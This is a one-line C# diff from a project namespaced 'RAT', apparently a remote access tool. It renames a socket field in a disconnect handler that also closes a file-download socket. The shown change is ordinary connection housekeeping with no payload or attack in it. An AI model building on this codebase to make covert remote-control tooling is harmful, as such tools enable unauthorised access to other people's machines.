@@ -57,7 +57,7 @@ namespace RAT.src.Logic.Sockets.Connection
         private void OnMainSocketDisconnect(IAsyncResult res)
         {
             StateObject state = _socketStateLogic.GetStateFromAsyncResult(res);
-            state.ClientSocket.EndDisconnect(res);
+            state.ClientMainSocket.EndDisconnect(res);
 
             // Now disconnect from file download socket.
             this.DisconnectFromFileDownloadSocket(state.ClientFileDownloadSocket);
